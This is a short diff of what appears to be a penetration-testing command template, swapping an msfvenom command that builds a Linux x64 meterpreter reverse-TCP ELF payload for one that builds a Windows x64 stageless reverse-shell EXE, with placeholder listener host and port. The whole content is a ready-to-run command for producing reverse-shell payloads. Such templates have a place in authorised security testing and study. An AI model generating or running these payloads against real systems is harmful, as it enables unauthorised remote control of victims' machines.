@@ -1,2 +1,2 @@
-# description: msfvenom Linux x64 unstaged reverse TCP meterpreter payload as ELF
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o reverse.elf
+# description: msfvenom Windows x64 stageless reverse TCP shell payload as exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o reverse.exe
